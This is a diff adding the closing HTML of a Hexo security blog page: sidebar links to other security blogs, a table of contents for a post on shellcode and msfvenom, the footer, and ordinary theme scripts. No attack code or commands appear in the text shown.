+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#视频演示："><span class="nav-number">1.</span> <span class="nav-text">视频演示：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-我有一个大胆的想法"><span class="nav-number">2.</span> <span class="nav-text">1.我有一个大胆的想法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-无心插柳柳成荫"><span class="nav-number">3.</span> <span class="nav-text">2.无心插柳柳成荫</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-shellcode-弹窗hellword-警告窗口"><span class="nav-number">4.</span> <span class="nav-text">3.shellcode 弹窗hellword 警告窗口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-shellcode-msfvenom"><span class="nav-number">5.</span> <span class="nav-text">4.shellcode_msfvenom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-shellcode-c-msf"><span class="nav-number">6.</span> <span class="nav-text">6.shellcode_c_msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-编译、监听、运行"><span class="nav-number">7.</span> <span class="nav-text">7.编译、监听、运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-Bash下的编写思路形成懒人自动化的脚本"><span class="nav-number">8.</span> <span class="nav-text">8.Bash下的编写思路形成懒人自动化的脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-开启上帝视角"><span class="nav-number">9.</span> <span class="nav-text">9.开启上帝视角</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关注一下"><span class="nav-number">10.</span> <span class="nav-text">关注一下</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
